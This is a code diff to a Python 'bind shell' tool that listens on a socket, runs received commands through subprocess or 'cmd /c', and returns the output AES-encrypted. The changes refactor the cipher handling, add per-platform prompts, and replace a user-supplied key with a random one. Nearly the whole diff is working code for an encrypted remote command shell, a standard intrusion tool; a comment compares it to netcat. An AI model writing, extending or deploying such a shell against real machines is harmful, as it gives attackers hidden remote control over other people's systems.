@@ -13,27 +13,30 @@ MAX_BUFFER = 4096
 class BindShell:
     def __init__(self):
         # An instance of the AESCipher class
-        self.aes_cipher = None
+        self.aes = None
 
     def encrypted_send(self, s, msg):
         """Send an AES-encrypted message."""
-        s.send(self.aes_cipher.cipher.encrypt(msg).encode('latin-1'))
+
+        encrypted = self.aes.encrypt(msg)
+        s.send(encrypted.encode('latin-1'))
 
     def execute_cmd(self, cmd):
         """Execute a Linux/Windows command."""
 
-        # On Linux system
         if platform.system() == 'Linux':
             try:
                 output = subprocess.check_output(cmd.split(), stderr=subprocess.STDOUT)
             except:
                 output = b'Command failed.'
-        # On Windows system
         elif platform.system() == 'Windows':
             try:
                 output = subprocess.check_output(f"cmd /c {cmd}", stderr=subprocess.STDOUT)
             except:
                 output = b'Command failed.'
+        else:
+            print('The system must be Linux or Windows. Terminating...')
+            sys.exit()
         
         return output
 
@@ -48,15 +51,29 @@ class BindShell:
 
     def shell_thread(self, s):
         """Multithreading interactive shell sesion."""
-        self.encrypted_send(b"[ -- Connected -- ]")
+        if platform.system() == 'Linux':
+            self.encrypted_send(s, b"[ -- Connected -- ]\n")
+        elif platform.system() == 'Windows':
+            self.encrypted_send(s, b"[ -- Connected -- ]\r\n")
+        else:
+            print('The system must be Linux or Windows. Terminating...')
+            sys.exit()
+
         try:
             while True:
-                self.encrypted_send(s, b"Enter command>")
-                data = s.recv(MAX_BUFFER)
+                if platform.system() == 'Linux':
+                    self.encrypted_send(s, b"\nEnter command>")
+                elif platform.system() == 'Windows':
+                    self.encrypted_send(s, b"\r\nEnter command>")
+                else:
+                    print('The system must be Linux or Windows. Terminating...')
+                    sys.exit()
 
+                data = s.recv(MAX_BUFFER)
                 if data:
-                    buffer= self.aes_cipher.cipher.decrypt(self.decode_and_strip(data))
+                    buffer = self.aes.decrypt(self.decode_and_strip(data))
                     buffer = self.decode_and_strip(buffer)
+
                     if not buffer or buffer == 'exit':
                         self.cleanup(s)
 
@@ -81,8 +98,9 @@ class BindShell:
         try:
             while True:
                 data = self.decode_and_strip(s.recv(MAX_BUFFER))
+
                 if data:
-                    data = self.aes_cipher.cipher.decrypt(data).decode('latin-1')
+                    data = self.aes.decrypt(data).decode('latin-1')
                     print(data, end='', flush=True)
         except:
             print('recv_thread error. Terminating...')
@@ -110,6 +128,7 @@ class BindShell:
         threading.Thread(target=self.recv_thread, args=(s,)).start()
 
     def run(self):
+        self.aes = AESCipher()
         parser = argparse.ArgumentParser()
 
         # Usage: python3 bind_shell.py -l
@@ -122,28 +141,15 @@ class BindShell:
             required=False,
         )
         # Usage: python3 bind_shell.py -c 127.0.0.1
-        # This is similar to nc 127.0.0.1 1337
+        # This is similar to nc 127.0.0.1 1337 with a random key
         parser.add_argument(
             '-c',
             '--connect',
             help='Connect to a bind shell',
             required=False,
         )
-        # Usage: python3 bind_shell.py -c 127.0.0.1 -k 
-        # This is similar to nc 127.0.0.1 1337
-        parser.add_argument(
-            '-k',
-            '--key',
-            help='Encryption key',
-            required=False,
-        )
 
         args = parser.parse_args()
-        
-        if args.key:
-            aes_cipher = AESCipher(bytearray.fromhex(args.key))
-        else:
-            aes_cipher = AESCipher()
 
         if args.listen:
             self.server()
